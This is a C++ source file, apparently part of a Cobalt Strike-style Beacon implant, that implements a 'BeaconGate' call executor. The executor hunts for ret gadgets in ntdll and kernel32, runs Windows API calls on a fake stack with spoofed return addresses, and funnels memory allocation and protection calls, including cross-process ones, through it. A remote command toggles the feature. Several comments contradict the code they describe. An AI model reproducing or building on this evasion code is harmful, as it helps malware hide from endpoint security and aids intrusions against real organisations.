/* beacon_gate.cpp - C-58 BeaconGate (4.10 parity)
 *
 * Official contract (4.10 blog, FUNCTION_CALL): when BeaconGate is enabled
 * for a supported API, Beacon packs the call into a FUNCTION_CALL
 * {functionPtr, function enum, numOfArgs, args[], bMask, retValue} and
 * hands it to the gate executor (official default = plain Railgun-style
 * dispatch). Our executor has two tiers:
 *
 *   1. spoofed (default when available): the call executes on a private
 *      fake stack whose unwind chain is the proven spoolsv shape (gen3
 *      frame table) - RtlVirtualUnwind from the callee sees only
 *      legitimate module frames. A jmp [rbp-8] gadget in a legit module
 *      serves as the callee's return address (return-address spoofing) and
 *      hops back to the recovery stub with RAX intact.
 *   2. plain: generic N-arg dispatch (official default parity).
 *
 * Any init failure (no gadget, gen3 frames unavailable, x86) degrades to
 * plain dispatch - the gate never breaks the call.
 */

#include <windows.h>
#include <string.h>
#include "beacon.h"
#include "commands.h"
#include "sleepmask_gen3.h"
#include "beacon_gate.h"
#include "parse.h" /* datap/data_int (cmd 123 payload) */

/* settings 96 = per-API bitmask; 97 = mode flags */
#define GATE_MODE_ALL             (1 << 0)

/* offsets mirror gate_spoof.asm exactly */
typedef struct {
	unsigned long long fn;         /* +0x00 */
	unsigned long long recovery;   /* +0x08 */
	unsigned long long saved_rsp;  /* +0x10 */
	unsigned long long pad;        /* +0x18 */
	unsigned long long result;     /* +0x20 */
	unsigned long long gadget;     /* +0x28 */
	unsigned long long fake_rsp;   /* +0x30 */
	unsigned long long args[4];    /* +0x38..+0x50 */
} GATE_SPOOFCTX;

#if defined(_M_X64)
extern "C" {
unsigned long long gate_spoof_execute(void * ctx); /* asm PROC - bare symbol */
void gate_spoof_recovery(void);                     /* asm PROC - bare symbol */
}
#endif

/* C-58: spoof-execution probe (called from gate_spoof_recovery in the
 * kdebug build; release spawn_log is a stub so the call is free) */
extern "C" const char gate_spoof_probe_tag[] = "gate: spoof exec fn=";
void gate_spoof_probe(unsigned long long fn);

static unsigned char *  g_gate_page;
static unsigned long long g_gate_pivot;
static unsigned long long g_gate_gadget;
static unsigned long    g_gate_hop;   /* 8 + gadget imm8: recovery slot offset */
static volatile long    g_gate_spoof_ready; /* 0=unknown, 1=ready, 2=plain */

/* ---------------- gate enablement ---------------- */

int gate_enabled(void)
{
	return setting_int(SETTING_BEACON_GATE_API) != 0
	    || setting_int(SETTING_BEACON_GATE_MODE) != 0;
}

int gate_api_enabled(int api_bit)
{
	if (!gate_enabled())
		return 0;
	if (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_ALL)
		return 1;
	return (setting_int(SETTING_BEACON_GATE_API) & api_bit) != 0;
}

/* ---------------- spoof tier init (x64) ---------------- */

#if defined(_M_X64)

/* scan a module's .text for `jmp [rbp-8]` (FF 65 F8) inside a function
 * whose unwind frame size covers our call area (retaddr+shadow+4 stack
 * args = 0x48); such a gadget both looks legit in walks and hops control
 * back to the recovery stub. */
static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long * out_extent)
{
	const char * mods[3] = { "ntdll.dll", "kernelbase.dll", "kernel32.dll" };
	int m;

	for (m = 0; m < 3; m++) {
		unsigned char * base = (unsigned char *)GetModuleHandleA(mods[m]);
		IMAGE_NT_HEADERS * nt;
		IMAGE_SECTION_HEADER * sec;
		int i;
		unsigned char * p;
		unsigned char * end;

		if (base == NULL)
			continue;
		nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
		sec = IMAGE_FIRST_SECTION(nt);
		for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
			if (memcmp(sec->Name, ".text", 5) != 0)
				continue;
			p = base + sec->VirtualAddress;
			end = p + sec->Misc.VirtualSize - 5;
			for (; p < end; p++) {
				DWORD sz = 0x48;
				/* add rsp, imm8; ret  (48 83 C4 xx C3): after fn's ret the
				 * gadget skips the dead shadow+stack-arg area and rets into
				 * the recovery address parked above the 8-arg slot block.
				 * The pop-rbp shape was unusable - its pop slots live in the
				 * fn-owned shadow space. */
				if (p[0] != 0x48 || p[1] != 0x83 || p[2] != 0xC4 || p[4] != 0xC3)
					continue;
				/* only 0x48/0x50: 8-aligned and strictly past the 8-arg
				 * stack block (0x28..0x48) - otherwise the parked recovery
				 * address would overlap an arg slot before the call */
				if (p[3] != 0x48 && p[3] != 0x50)
					continue;
				KD("gate: gadget hit mod=", (long)m);
				/* extent from the gadget address through its function frame;
				 * leaf/unwindless sites keep the 0x48 default */
				if (g3_gate_frame_size_at((unsigned long long)p, &sz) && sz > 0x48 && sz < 0x6000)
					sz = sz;
				else
					sz = 0x48;
				*out_gadget = (unsigned long long)p;
				*out_extent = sz;
				g_gate_hop = 8 + p[3];
				return TRUE;
			}
		}
	}
	return FALSE;
}

static void gate_init_spoof(void)
{
	unsigned long long fr[4];
	unsigned long long gadget = 0, extent = 0;
	unsigned long long slot;
	unsigned long sizes[4];
	int i;

	if (g_gate_spoof_ready != 0)
		return;

	g_gate_page = (unsigned char *)VirtualAlloc(NULL, 0x40000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (g_gate_page == NULL) {
		KD("gate: plain (no page)", 0);
		g_gate_spoof_ready = 2;
		return;
	}
	if (!g3_gate_frames(fr, sizes)) {
		KD("gate: plain (frames fail)", 0);
		g_gate_spoof_ready = 2;
		return;
	}
	if (!gate_find_gadget(&gadget, &extent)) {
		KD("gate: plain (no gadget)", 0);
		g_gate_spoof_ready = 2;
		return;
	}

	/* pivot: page + 0x8000 (= 8 mod 16, x64 ABI at fn entry). The gated
	 * call's ENTIRE call tree runs on this stack and grows DOWN from the
	 * pivot - 32KB headroom below, chain laid above toward the page top.
	 * (The first live round used page+0x48: 0x48 bytes of headroom could
	 * not hold InternetConnectA's deep tree.)
	 *
	 * Control-transfer via a `pop rbp; ret` gadget in a legit module:
	 *   [pivot+0x00] = gadget site (fn's return address - legit frame)
	 *   [pivot+0x08] = value popped into rbp (ctx+0x10)
	 *   [pivot+0x10] = recovery address (the gadget's ret lands here)
	 * fn preserves rbp (=ctx+0x10 from the asm prologue), so the popped
	 * value matches what gate_spoof_recovery expects. */
	/* pivot near the top: 252KB of headroom below for the gated call's
	 * tree, chain + parked recovery laid above toward the page end */
		/* pivot + 8: x64 ABI expects rsp==8 (mod 16) at fn ENTRY (a real call
	 * pushes an 8-byte retaddr onto an aligned rsp) - jmp does not push,
	 * so the pivot itself must carry the +8. Misaligned entry killed
	 * InternetOpenA's tree at WININET!_tailMerge_iertutil_dll movdqa. */
	g_gate_pivot = (unsigned long long)g_gate_page + 0x3f008;
	slot = g_gate_pivot + 0x80; /* above the parked recovery slot */
	if (slot + 0x300 > g_gate_pivot + 0x1000) { /* chain must fit the top margin */
		g_gate_spoof_ready = 2;
		return;
	}
	for (i = 0; i < 4; i++) {
		*(unsigned long long *)slot = fr[i];
		slot += sizes[i];
	}
	*(unsigned long long *)slot = 0; /* trailing NULL stops the unwind */

	g_gate_gadget = gadget;
	g_gate_spoof_ready = 1;
	KD("gate: spoof ready gadget=", (long)gadget);
}

#endif /* _M_X64 (spoof tier) */

/* ---------------- executor (common) ---------------- */

static unsigned long long gate_exec_plain(FUNCTION_CALL * fc)
{
	typedef unsigned long long (WINAPI * G0)();
	typedef unsigned long long (WINAPI * G1)(unsigned long long);
	typedef unsigned long long (WINAPI * G2)(unsigned long long, unsigned long long);
	typedef unsigned long long (WINAPI * G3)(unsigned long long, unsigned long long, unsigned long long);
	typedef unsigned long long (WINAPI * G4)(unsigned long long, unsigned long long, unsigned long long, unsigned long long);
	typedef unsigned long long (WINAPI * G8)(unsigned long long, unsigned long long, unsigned long long, unsigned long long,
	                                         unsigned long long, unsigned long long, unsigned long long, unsigned long long);

	switch (fc->numOfArgs) {
	case 0:  return ((G0)fc->functionPtr)();
	case 1:  return ((G1)fc->functionPtr)(fc->args[0]);
	case 2:  return ((G2)fc->functionPtr)(fc->args[0], fc->args[1]);
	case 3:  return ((G3)fc->functionPtr)(fc->args[0], fc->args[1], fc->args[2]);
	case 4:  return ((G4)fc->functionPtr)(fc->args[0], fc->args[1], fc->args[2], fc->args[3]);
	default:
		/* x64 WinAPI: extra stack slots are caller-owned and ignored by
		 * fixed-arg callees - the 8-arg cast is safe for our API set */
		return ((G8)fc->functionPtr)(fc->args[0], fc->args[1], fc->args[2], fc->args[3],
		                             fc->args[4], fc->args[5], fc->args[6], fc->args[7]);
	}
}

void gate_spoof_probe(unsigned long long fn)
{
	spawn_log(gate_spoof_probe_tag, (long)fn);
}

unsigned long long gate_dispatch(FUNCTION_CALL * fc)
{
#if defined(_M_X64)
	GATE_SPOOFCTX ctx;
	int i;

	if (g_gate_spoof_ready == 0)
		gate_init_spoof();

	if (g_gate_spoof_ready == 1) {
		memset(&ctx, 0, sizeof(ctx));
		ctx.fn       = (unsigned long long)fc->functionPtr;
		ctx.recovery = (unsigned long long)&gate_spoof_recovery;
		ctx.gadget   = g_gate_gadget;
		ctx.fake_rsp = g_gate_pivot;
		for (i = 0; i < 4 && i < fc->numOfArgs; i++)
			ctx.args[i] = fc->args[i];
		/* add-rsp hop: park the recovery address above the 8-arg stack
		 * block; the gadget skips the dead shadow+args area and rets here
		 * (rbp survives the call = ctx+0x10, as the asm prologue set it) */
		*(unsigned long long *)(g_gate_pivot + g_gate_hop) =
			(unsigned long long)&gate_spoof_recovery;
		/* stack args 5..8 pre-lay into the fake frame's arg area */
		for (i = 4; i < fc->numOfArgs && i < 8; i++)
			*(unsigned long long *)(g_gate_pivot + 0x28 + 8 * (i - 4)) = fc->args[i];
		fc->retValue = gate_spoof_execute(&ctx);
		return fc->retValue;
	}
#endif
	fc->retValue = gate_exec_plain(fc);
	return fc->retValue;
}

/* ---------------- gate wrappers (call-site funnels) ---------------- */

LPVOID gate_VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD protect)
{
	FUNCTION_CALL fc = {0};
	fc.functionPtr = (void *)VirtualAlloc;
	fc.function    = GATE_API_VIRTUALALLOC;
	fc.numOfArgs   = 4;
	fc.args[0] = (unsigned long long)addr;
	fc.args[1] = (unsigned long long)size;
	fc.args[2] = (unsigned long long)type;
	fc.args[3] = (unsigned long long)protect;
	return (LPVOID)gate_dispatch(&fc);
}

LPVOID gate_VirtualAllocEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD protect)
{
	FUNCTION_CALL fc = {0};
	HMODULE k32 = GetModuleHandleA("kernel32.dll");
	FARPROC fn = k32 ? GetProcAddress(k32, "VirtualAllocEx") : NULL;
	if (fn == NULL)
		return VirtualAllocEx(proc, addr, size, type, protect);
	fc.functionPtr = (void *)fn;
	fc.function    = GATE_API_VIRTUALALLOCEX;
	fc.numOfArgs   = 5;
	fc.args[0] = (unsigned long long)proc;
	fc.args[1] = (unsigned long long)addr;
	fc.args[2] = (unsigned long long)size;
	fc.args[3] = (unsigned long long)type;
	fc.args[4] = (unsigned long long)protect;
	return (LPVOID)gate_dispatch(&fc);
}

BOOL gate_VirtualProtect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD old)
{
	FUNCTION_CALL fc = {0};
	fc.functionPtr = (void *)VirtualProtect;
	fc.function    = GATE_API_VIRTUALPROTECT;
	fc.numOfArgs   = 4;
	fc.args[0] = (unsigned long long)addr;
	fc.args[1] = (unsigned long long)size;
	fc.args[2] = (unsigned long long)protect;
	fc.args[3] = (unsigned long long)old;
	return (BOOL)gate_dispatch(&fc);
}

BOOL gate_VirtualProtectEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD protect, PDWORD old)
{
	FUNCTION_CALL fc = {0};
	HMODULE k32 = GetModuleHandleA("kernel32.dll");
	FARPROC fn = k32 ? GetProcAddress(k32, "VirtualProtectEx") : NULL;
	if (fn == NULL)
		return VirtualProtectEx(proc, addr, size, protect, old);
	fc.functionPtr = (void *)fn;
	fc.function    = GATE_API_VIRTUALPROTECTEX;
	fc.numOfArgs   = 5;
	fc.args[0] = (unsigned long long)proc;
	fc.args[1] = (unsigned long long)addr;
	fc.args[2] = (unsigned long long)size;
	fc.args[3] = (unsigned long long)protect;
	fc.args[4] = (unsigned long long)old;
	return (BOOL)gate_dispatch(&fc);
}

/* ---------------- runtime toggle (command 123) ---------------- */

void command_beacon_gate(char * buffer, int length, void (*callback)(char * buffer, int length, int type))
{
	datap parser;
	int enable;

	data_init(&parser, buffer, length);
	enable = data_int(&parser);

	/* live settings-table rewrite: 0 = off, 1 = All (official command
	 * semantic is enable/disable; All matches the "instrument everything"
	 * bring-up use) */
	setting_apply_int(SETTING_BEACON_GATE_MODE, enable ? GATE_MODE_ALL : 0);
	if (!enable)
		setting_apply_int(SETTING_BEACON_GATE_API, 0);

	callback((char *)"", 0, CALLBACK_OUTPUT);
}
